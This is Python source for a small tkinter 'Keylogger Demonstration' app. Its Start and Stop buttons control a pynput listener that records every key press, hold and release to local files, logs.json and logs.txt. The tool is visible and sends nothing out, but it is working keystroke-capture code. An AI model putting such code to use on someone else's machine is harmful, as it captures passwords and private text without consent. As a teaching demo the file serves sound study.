import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import threading  # Required to fix the "Not Responding" freeze

# GUI Initialization
root = tk.Tk()
root.geometry("350x250")
root.title("Keylogger Page")

key_list = []
x = False
key_strokes = ""
listener = None  # Global variable to hold the listener instance

# File Update Functions
def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'wb') as key_log: # Fixed: '+wb' to 'wb'
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

# Keyboard Event Handlers
def on_press(key):
    global x, key_list
    if not x:
        key_list.append({'Pressed': f'{key}'})
        x = True
    else:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    x = False
    update_json_file(key_list)

    key_strokes += str(key)
    update_txt_file(str(key_strokes))

# Start Function
def start_keylogger():
    global listener
    if listener is None or not listener.running:
        print("[+] Running Keylogger successfully!")
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start() # Start without .join() to keep it non-blocking

def butaction():
    # Use threading so the GUI doesn't freeze
    t1 = threading.Thread(target=start_keylogger)
    t1.daemon = True # Closes thread if GUI is closed
    t1.start()

# Stop Function
def stop_keylogger():
    global listener
    if listener:
        listener.stop()
        print("[!] Keylogger stopped.")

# GUI Layout
Label(root, text="Keylogger Demonstration", font='Verdana 11 bold').pack(pady=10)

start_btn = Button(root, text="Start Keylogger", command=butaction, bg="green", fg="white", width=20)
start_btn.pack(pady=5)

stop_btn = Button(root, text="Stop Keylogger", command=stop_keylogger, bg="red", fg="white", width=20)
stop_btn.pack(pady=5)

root.mainloop()